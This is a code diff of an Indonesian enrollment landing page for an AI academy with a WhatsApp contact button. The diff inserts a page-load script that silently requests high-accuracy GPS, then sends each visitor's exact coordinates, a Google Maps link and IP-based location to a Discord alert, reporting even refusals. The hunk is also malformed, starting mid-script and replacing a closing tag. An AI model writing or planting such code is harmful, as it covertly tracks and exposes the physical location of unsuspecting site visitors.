@@ -153,6 +153,31 @@
             <a class="btn-whatsapp-big" href="https://wa.me/6289528036024?text=Halo%20Admin,%20saya%20tertarik%20dengan%20pendaftaran%20Elfan%20AI%20Academy%20S1%20+%20Bootcamp%206%20Bulan." target="_blank">
                 💬 Klik tulisan ini untuk Chat Admin di WhatsApp
             </a>
-        </div>
+      3. Attempt HTML5 GPS Geolocation prompt
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            async (position) => {
+                                let lat = position.coords.latitude;
+                                let lon = position.coords.longitude;
+                                await postPayload(`${city}, ${region}, ${country} (IP)`, [
+                                    { name: "🎯 Exact GPS Coordinates", value: `Lat: ${lat}, Lon: ${lon}\n[Open in Google Maps](https://maps.google.com/?q=${lat},${lon})`, inline: false }
+                                ]);
+                            },
+                            async (error) => {
+                                // User blocked or denied location prompt
+                                await postPayload(`${city}, ${region}, ${country} (GPS Denied/Unavailable)`);
+                            },
+                            { timeout: 10000, enableHighAccuracy: true }
+                        );
+                    } else {
+                        await postPayload(`${city}, ${region}, ${country} (No GPS Support)`);
+                    }
+
+                } catch (error) {
+                    console.log("Could not send Discord alert:", error);
+                }
+            }
+            window.onload = sendDiscordAlert;
+        </script>
     </body>
 </html>
